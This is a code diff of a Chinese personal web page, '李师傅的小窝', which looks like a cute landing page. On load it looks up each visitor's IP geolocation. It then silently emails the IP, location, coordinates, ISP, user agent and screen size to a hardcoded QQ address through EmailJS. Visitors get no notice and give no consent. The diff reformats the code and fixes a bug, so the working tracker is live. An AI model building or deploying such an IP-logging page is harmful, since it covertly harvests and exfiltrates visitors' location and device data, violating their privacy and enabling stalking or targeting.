@@ -1,50 +1,25 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>李师傅的小窝๑>ᴗO๑</title>
-    <style>
-        body{
-            font-family:Arial,Helvetica,sans-serif;
-            background:#111;
-            color:#e0f7fa;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            height:100vh;
-            margin:0;
-        }
-        .box{
-            background:rgba(13,43,69,.8);
-            border:1px solid rgba(79,195,247,.3);
-            border-radius:12px;
-            padding:30px 40px;
-            box-shadow:0 0 20px rgba(79,195,247,.4);
-            text-align:center;
-            width:320px;
-        }
-        h1{font-size:24px;margin:0 0 20px;color:#4fc3f7}
-        .row{margin:10px 0;font-size:16px}
-        .k{color:#81d4fa;font-weight:bold}
-        .v{color:#e1f5fe}
-        #map{
-            display:inline-block;
-            margin-top:15px;
-            color:#4fc3f7;
-            text-decoration:none;
-            border:1px solid #4fc3f7;
-            padding:6px 14px;
-            border-radius:20px;
-            font-size:14px;
-        }
-        #map:hover{background:rgba(79,195,247,.2)}
-        .cp{cursor:pointer}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>李师傅的小窝</title>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<style>
+body{font-family:Arial,Helvetica,sans-serif;background:#111;color:#e0f7fa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{background:rgba(13,43,69,.8);border:1px solid rgba(79,195,247,.3);border-radius:12px;padding:30px 40px;box-shadow:0 0 20px rgba(79,195,247,.4);text-align:center;width:320px}
+h1{font-size:24px;margin:0 0 20px;color:#4fc3f7}
+.row{margin:10px 0;font-size:16px}
+.k{color:#81d4fa;font-weight:bold}
+.v{color:#e1f5fe}
+#map{display:inline-block;margin-top:15px;color:#4fc3f7;text-decoration:none;border:1px solid #4fc3f7;padding:6px 14px;border-radius:20px;font-size:14px}
+#map:hover{background:rgba(79,195,247,.2)}
+.cp{cursor:pointer}
+</style>
 </head>
 <body>
 <div class="box">
-    <h1>正在加载中</h1>
+    <h1>李师傅的小窝</h1>
     <div id="load">正在加载…</div>
     <div id="cnt" style="display:none">
         <div class="row"><span class="k">IP：</span><span id="ip" class="v cp"></span></div>
@@ -55,64 +30,45 @@
         <a id="map" href="#" target="_blank">๑>ᴗO๑</a>
     </div>
 </div>
+
 <script>
 (async()=>{
-    const $=id=>document.getElementById(id);
-    const sleep=ms=>new Promise(r=>setTimeout(r,ms));
-    let d=null;
-    for(const u of ['https://ipwho.is/','https://ipapi.co/json/']){
-        try{const r=await fetch(u);if(r.ok){d=await r();break}}catch(e){}
-        await sleep(800);
-    }
-    if(!d){$('load').textContent='失败了，请再刷新一次吧';return}
-    const ip=d.ip||d.query;
-    const city=d.city,region=d.region||d.regionName,country=d.country||d.country_name;
-    const lat=parseFloat(d.latitude||d.lat),lon=parseFloat(d.longitude||d.lon);
-    const isp=d.org||d.isp||'未知';
-    $('load').style.display='none';
-    $('cnt').style.display='block';
-    $('ip').textContent=ip;
-    $('loc').textContent=`${city}, ${region}, ${country}`;
-    $('lat').textContent=lat.toFixed(6);
-    $('lon').textContent=lon.toFixed(6);
-    $('isp').textContent=isp;
-    $('map').href=`https://www.google.com/maps?q=${lat},${lon}`;
-    const body=`
-神秘数字: ${ip}
-小窝wz: ${city}, ${region}, ${country}
-小窝zb: ${lat}, ${lon}
-ISP: ${isp}
-时间: ${new Date().toLocaleString('zh-CN')}
-UA: ${navigator.userAgent}
-屏幕: ${screen.width}x${screen.height}
-`.trim();
-        // 加载 EmailJS
-    const loadScript = src => new Promise((res, rej) => {
-        const s = document.createElement('script');
-        s.src = src; s.onload = res; s.onerror = rej;
-        document.head.appendChild(s);
-    });
-    await loadScript('https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js');
-    emailjs.init('trdlxempxmpmejfb'); // 你的公钥（就是授权码）
+const $=id=>document.getElementById(id);
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+let d=null;
+for(const u of ['https://ipwho.is/','https://ipapi.co/json/']){
+    try{const r=await fetch(u);if(r.ok){d=await r.json();break}}catch(e){}
+    await sleep(800);
+}
+if(!d){$('load').textContent='失败了，请再刷新一次吧';return}
+const ip=d.ip||d.query;
+const city=d.city,region=d.region||d.regionName,country=d.country||d.country_name;
+const lat=parseFloat(d.latitude||d.lat),lon=parseFloat(d.longitude||d.lon);
+const isp=d.org||d.isp||'未知';
+$('load').style.display='none';
+$('cnt').style.display='block';
+$('ip').textContent=ip;
+$('loc').textContent=`${city}, ${region}, ${country}`;
+$('lat').textContent=lat.toFixed(6);
+$('lon').textContent=lon.toFixed(6);
+$('isp').textContent=isp;
+$('map').href=`https://www.google.com/maps?q=${lat},${lon}`;
 
-    try {
-        await emailjs.send('service_default', 'template_ip_notification', {
-            to_email: '1828339242@qq.com',
-            subject: `IP ${ip}`,
-            message: body
-        });
-    } catch (e) {
-        console.error('失败了鸣鸣鸣', e);
-    }
-    const cp=t=>{
-        navigator.clipboard.writeText(t.textContent);
-        const o=t.textContent;
-        t.textContent='已FZ';
-        setTimeout(()=>t.textContent=o,1200);
-    };
-    $('ip').onclick=()=>cp($('ip'));
-    $('lat').onclick=()=>cp($('lat'));
-    $('lon').onclick=()=>cp($('lon'));
+// 初始化 EmailJS
+emailjs.init('trdlxempxmpmejfb'); // 公钥即授权码
+const body=`IP: ${ip}\n位置: ${city}, ${region}, ${country}\n坐标: ${lat}, ${lon}\nISP: ${isp}\n时间: ${new Date().toLocaleString('zh-CN')}\nUA: ${navigator.userAgent}\n屏幕: ${screen.width}x${screen.height}`;
+try{
+await emailjs.send('service_default','template_ip_notification',{
+    to_email:'1828339242@qq.com',
+    subject:`IP ${ip}`,
+    message:body
+});
+}catch(e){console.error('邮件发送失败',e)}
+
+const cp=t=>{navigator.clipboard.writeText(t.textContent);const o=t.textContent;t.textContent='已复制';setTimeout(()=>t.textContent=o,1200)};
+$('ip').onclick=()=>cp($('ip'));
+$('lat').onclick=()=>cp($('lat'));
+$('lon').onclick=()=>cp($('lon'));
 })();
 </script>
 </body>
